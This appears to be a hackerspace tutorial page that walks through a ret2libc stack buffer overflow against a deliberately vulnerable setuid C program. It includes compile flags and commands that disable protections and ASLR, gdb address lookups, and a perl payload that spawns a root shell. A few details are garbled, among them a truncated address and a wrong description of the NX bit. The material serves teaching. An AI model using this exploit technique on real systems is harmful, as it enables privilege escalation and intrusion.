th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒
</code></pre>
<p>And get a shell with a clean exit.</p>
<h2>Brief overview of a few common buffer overflow protection mechanisms</h2>
<ul>
<li>
<p>ASLR (Address Space Layout Randomization)</p>
</li>
<li>
<p>ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.</p>
</li>
<li>
<p>Canary</p>
</li>
<li>
<p>Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.</p>
</li>
<li>
<p>RELRO (RELocation Read-Only)</p>
</li>
<li>
<p>RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.</p>
</li>
<li>
<p>NX bit (Non-executable bit)</p>
</li>
<li>
<p>Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.</p>
</li>
<li>
<p>AMD uses the terminology "Enhanced Virus Protection" for the NX bit.</p>
</li>
<li>
<p>Intel refers to it as the "XD (eXecute Disabled) bit."</p>
</li>
<li>
<p>ARM refers to it as the "XN (eXecute Never) bit."</p>
</li>
</ul>
<h2>Further Reading</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection">BOF protection</a></li>
<li><a href="https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/">Understanding Buffer Overflow Attacks</a></li>
<li><a href="https://en.wikipedia.org/wiki/Stack_(abstract_data_type)">Stack - Abstract Data Type</a></li>
<li><a href="http://insecure.org/stf/smashstack.html">Smashing The Stack For Fun And Profit</a></li>
<li><a href="https://0x00sec.org/search?q=stack%20overflow">0x00 sec</a></li>
<li><a href="https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf">Black Hat - Difference between BOF preventions and weaknesses</a></li>
<li><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634">Exploit Mitigation Techniques - DEP</a></li>
<li><a href="http://shellblade.net/docs/ret2libc.pdf">Shellblade ret2libc</a></li>
<li><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937">x64 ROP</a></li>
<li><a href="https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580">UAF heap overflow</a></li>
<li><a href="https://www.exploit-db.com/papers/13171/">NOP sled</a></li>
</ul>
<h2>Tools</h2>
<ul>
<li><a href="https://github.com/hugsy/gef/">GEF - GDB Enhanced Features</a></li>
<li><a href="https://github.com/rootlabs/smap/">SMAP - Shellcode Mapper</a></li>
<li><a href="https://github.com/radare/radare2/">Radare2</a></li>
<li><a href="https://github.com/radareorg/cutter">Cutter - Radare2 QT GUI</a></li>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">MSFvenom</a></li>
<li><a href="https://github.com/Gallopsled/pwntools">pwntools</a></li>
<li><a href="http://www.unicorn-engine.org/">Unicorn - CPU emulator</a></li>
</ul>
<h2>Cheatsheets</h2>
<ul>
<li><a href="https://i.imgur.com/Xe1m6C3.png">Memory Segmentation</a></li>
<li><a href="https://i.imgur.com/ewrWkEa.png">Reverse Engineering</a></li>
<li><a href="https://github.com/radare/radare2/blob/master/doc/intro.md">radare2</a></li>
</ul>
<h2>Other</h2>
<ul>
<li><a href="http://shell-storm.org/shellcode/">Shellcode Database</a></li>
<li><a href="https://sourceware.org/gdb/current/onlinedocs/gdb/">GDB documentation</a></li>
<li><a href="http://gef.readthedocs.io/en/master/">GEF documentation</a></li>
<li><a href="http://asm.sourceforge.net/syscall.html">Linux 32bit syscalls</a></li>
</ul>
</div></div></div></main><footer class="page-footer bg-lime-900 text-white pt-10 pb-16"><div class="container-1200 mx-auto px-5"><ul class="flex flex-wrap justify-center mb-10"><li class="m-3"><a class="link--white" href="https://discord.gg/uRSthurdPY" rel="noopener" target="_blank" title="Discord"><span class="sr-only">Discord</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="discord" class="svg-inline--fa fa-discord fa-w-20 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://twitter.com/801labs" rel="noopener" target="_blank" title="Twitter"><span class="sr-only">Twitter</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter-square" class="svg-inline--fa fa-twitter-square fa-w-14 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://www.meetup.com/801labs/" rel="noopener" target="_blank" title="Meetup"><span class="sr-only">Meetup</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="meetup" class="svg-inline--fa fa-meetup fa-w-16 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M99 414.3c1.1 5.7-2.3 11.1-8 12.3-5.4 1.1-10.9-2.3-12-8-1.1-5.4 2.3-11.1 7.7-12.3 5.4-1.2 11.1 2.3 12.3 8zm143.1 71.4c-6.3 4.6-8 13.4-3.7 20 4.6 6.6 13.4 8.3 20 3.7 6.3-4.6 8-13.4 3.4-20-4.2-6.5-13.1-8.3-19.7-3.7zm-86-462.3c6.3-1.4 10.3-7.7 8.9-14-1.1-6.6-7.4-10.6-13.7-9.1-6.3 1.4-10.3 7.7-9.1 14 1.4 6.6 7.6 10.6 13.9 9.1zM34.4 226.3c-10-6.9-23.7-4.3-30.6 6-6.9 10-4.3 24 5.7 30.9 10 7.1 23.7 4.6 30.6-5.7 6.9-10.4 4.3-24.1-5.7-31.2zm272-170.9c10.6-6.3 13.7-20 7.7-30.3-6.3-10.6-19.7-14-30-7.7s-13.7 20-7.4 30.6c6 10.3 19.4 13.7 29.7 7.4zm-191.1 58c7.7-5.4 9.4-16 4.3-23.7s-15.7-9.4-23.1-4.3c-7.7 5.4-9.4 16-4.3 23.7 5.1 7.8 15.6 9.5 23.1 4.3zm372.3 156c-7.4 1.7-12.3 9.1-10.6 16.9 1.4 7.4 8.9 12.3 16.3 10.6 7.4-1.4 12.3-8.9 10.6-16.6-1.5-7.4-8.9-12.3-16.3-10.9zm39.7-56.8c-1.1-5.7-6.6-9.1-12-8-5.7 1.1-9.1 6.9-8 12.6 1.1 5.4 6.6 9.1 12.3 8 5.4-1.5 9.1-6.9 7.7-12.6zM447 138.9c-8.6 6-10.6 17.7-4.9 26.3 5.7 8.6 17.4 10.6 26 4.9 8.3-6 10.3-17.7 4.6-26.3-5.7-8.7-17.4-10.9-25.7-4.9zm-6.3 139.4c26.3 43.1 15.1 100-26.3 129.1-17.4 12.3-37.1 17.7-56.9 17.1-12 47.1-69.4 64.6-105.1 32.6-1.1.9-2.6 1.7-3.7 2.9-39.1 27.1-92.3 17.4-119.4-22.3-9.7-14.3-14.6-30.6-15.1-46.9-65.4-10.9-90-94-41.1-139.7-28.3-46.9.6-107.4 53.4-114.9C151.6 70 234.1 38.6 290.1 82c67.4-22.3 136.3 29.4 130.9 101.1 41.1 12.6 52.8 66.9 19.7 95.2zm-70 74.3c-3.1-20.6-40.9-4.6-43.1-27.1-3.1-32 43.7-101.1 40-128-3.4-24-19.4-29.1-33.4-29.4-13.4-.3-16.9 2-21.4 4.6-2.9 1.7-6.6 4.9-11.7-.3-6.3-6-11.1-11.7-19.4-12.9-12.3-2-17.7 2-26.6 9.7-3.4 2.9-12 12.9-20 9.1-3.4-1.7-15.4-7.7-24-11.4-16.3-7.1-40 4.6-48.6 20-12.9 22.9-38 113.1-41.7 125.1-8.6 26.6 10.9 48.6 36.9 47.1 11.1-.6 18.3-4.6 25.4-17.4 4-7.4 41.7-107.7 44.6-112.6 2-3.4 8.9-8 14.6-5.1 5.7 3.1 6.9 9.4 6 15.1-1.1 9.7-28 70.9-28.9 77.7-3.4 22.9 26.9 26.6 38.6 4 3.7-7.1 45.7-92.6 49.4-98.3 4.3-6.3 7.4-8.3 11.7-8 3.1 0 8.3.9 7.1 10.9-1.4 9.4-35.1 72.3-38.9 87.7-4.6 20.6 6.6 41.4 24.9 50.6 11.4 5.7 62.5 15.7 58.5-11.1zm5.7 92.3c-10.3 7.4-12.9 22-5.7 32.6 7.1 10.6 21.4 13.1 32 6 10.6-7.4 13.1-22 6-32.6-7.4-10.6-21.7-13.5-32.3-6z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://www.youtube.com/c/801LabsSaltLakeCity" rel="noopener" target="_blank" title="YouTube"><span class="sr-only">YouTube</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="youtube" class="svg-inline--fa fa-youtube fa-w-18 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://github.com/801labs/" rel="noopener" target="_blank" title="GitHub"><span class="sr-only">GitHub</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" class="svg-inline--fa fa-github fa-w-16 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></li></ul><div class="grid grid-cols-2 lg:grid-cols-4 gap-5 mb-10"><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/about/">About</a></h2><ul class="space-y-2"><li><a class="link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="link--white" href="/about/news/1/">News</a></li></ul></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/research-portal/1/">Learn</a></h2></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/get-involved/">Get Involved</a></h2><ul class="space-y-2"><li><a class="link--white" href="/get-involved/events/">Events</a></li><li><a class="link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="link--white" href="/hackercamp/">Hackercamp</a></li></ul></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/nonprofit/">Nonprofit</a></h2></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/contact/">Contact Us</a></h2></div></div><div class="border-t border-white fluid-text-sm text-center pt-10 space-y-5"><p>© <!-- -->2025<!-- --> 801Labs.org. All rights reserved.</p><p><a class="link--tangerine uppercase" href="/donate/">Donate &gt;</a></p><p>801 Labs hackerspace is a 501(c)(3) that is open to the public!<br/>353 East 200 South Suite #201, Salt Lake City, UT 84111</p><p><a class="link--tangerine" href="/code-of-conduct/">Code of Conduct</a><span class="mx-3">|</span><a class="link--tangerine" href="/terms/">Terms</a></p></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"allTags":{"bash":"bash","biohacking":"biohacking","buffer-overflow":"buffer overflow","command-injection":"command injection","development":"Development","dll-injection":"DLL Injection","domains":"domains","ee":"EE","how-to":"how to","ipv6":"IPv6","langsec":"langsec","linux":"linux","makefile":"Makefile","memory":"memory","parsing":"parsing","pcap":"pcap","phishing":"phishing","re":"RE","research":"research","rfid":"RFID","shell":"shell","story":"Story","tutorial":"Tutorial","windows-api":"Windows API","windows-hacking":"Windows Hacking"},"title":"Exploiting a Stack Buffer Overflow (ret2libc method)","slug":"stack-exploitation","date_published":1547813100000,"date_updated":1547814692000,"tags":["research","memory","how to","buffer overflow"],"excerpt":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include \u003cstring.h\u003e\n    #include \u003cunistd.h\u003e\n    #include \u003csys/cdefs.h\u003e\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc \u003e 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 \u003e /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gef➤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 \u003c+0\u003e:\tpush   ebp\n       0x08048417 \u003c+1\u003e:\tmov    ebp,esp\n       0x08048419 \u003c+3\u003e:\tsub    esp,0x100\n       0x0804841f \u003c+9\u003e:\tpush   0x0\n       0x08048421 \u003c+11\u003e:\tcall   0x8048300 \u003csetuid@plt\u003e\n       0x08048426 \u003c+16\u003e:\tadd    esp,0x4\n       0x08048429 \u003c+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d \u003c+23\u003e:\tjle    0x8048447 \u003cmain+49\u003e\n       0x0804842f \u003c+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 \u003c+28\u003e:\tadd    eax,0x4\n       0x08048435 \u003c+31\u003e:\tmov    eax,DWORD PTR [eax]\n       0x08048437 \u003c+33\u003e:\tpush   eax\n       0x08048438 \u003c+34\u003e:\tlea    eax,[ebp-0x100]\n       0x0804843e \u003c+40\u003e:\tpush   eax\n       0x0804843f \u003c+41\u003e:\tcall   0x80482e0 \u003cstrcpy@plt\u003e\n       0x08048444 \u003c+46\u003e:\tadd    esp,0x8\n       0x08048447 \u003c+49\u003e:\tmov    eax,0x0\n       0x0804844c \u003c+54\u003e:\tleave  \n       0x0804844d \u003c+55\u003e:\tret    \n    End of assembler dump.\n    @gef➤  q\n    \n\n       0x08048416 \u003c+0\u003e:\tpush   ebp\n       0x08048417 \u003c+1\u003e:\tmov    ebp,esp\n       0x08048419 \u003c+3\u003e:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f \u003c+9\u003e:\tpush   0x0\n       0x08048421 \u003c+11\u003e:\tcall   0x8048300 \u003csetuid@plt\u003e\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 \u003c+16\u003e:\tadd    esp,0x4\n       0x08048429 \u003c+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d \u003c+23\u003e:\tjle    0x8048447 \u003cmain+49\u003e\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `\u003cmain+39\u003e` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc \u003e) {...}` condition.\n\n       0x0804842f \u003c+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 \u003c+28\u003e:\tadd    eax,0x4\n       0x08048435 \u003c+31\u003e:\tmov    eax,DWORD PTR [eax]\n       0x08048437 \u003c+33\u003e:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 \u003c+34\u003e:\tlea    eax,[ebp-0x100]\n       0x0804843e \u003c+40\u003e:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f \u003c+41\u003e:\tcall   0x80482e0 \u003cstrcpy@plt\u003e\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 \u003c+46\u003e:\tadd    esp,0x8\n       0x08048447 \u003c+49\u003e:\tmov    eax,0x0\n       0x0804844c \u003c+54\u003e:\tleave  \n       0x0804844d \u003c+55\u003e:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 =\u003e /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q bin/sof\n    \n    @gef➤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gef➤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gef➤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gef➤  p system\n    $1 = {\u003ctext variable, no debug info\u003e} 0xf7e2c540 \u003c__libc_system\u003e\n    \n    @gef➤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# 